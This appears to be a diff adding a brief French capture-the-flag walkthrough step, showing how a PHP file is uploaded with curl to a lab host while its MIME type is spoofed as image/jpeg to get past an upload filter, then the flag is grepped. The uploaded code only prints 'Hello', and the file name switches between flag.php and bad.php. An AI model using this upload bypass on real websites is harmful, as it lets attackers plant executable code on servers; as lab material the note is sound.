@@ -1,0 +1,10 @@
+On cree un fichier php via commande : echo '<?php echo "Hello"; ?>' > /tmp/flag.php
+on verifie aue le fichier existe, ls -l /tmp/bad.php
+je le cat /tmp/bad.php (il fonctionne bien) et apres: 
+curl -X POST \
+-F "Upload=Upload" \
+-F "uploaded=@/tmp/bad.php;type=image/jpeg" \
+"http://192.168.56.101/index.php?page=upload"
+
+on peut trouver la page avec notre fichier php uploade et faire un 
+grep 'The flag is :'
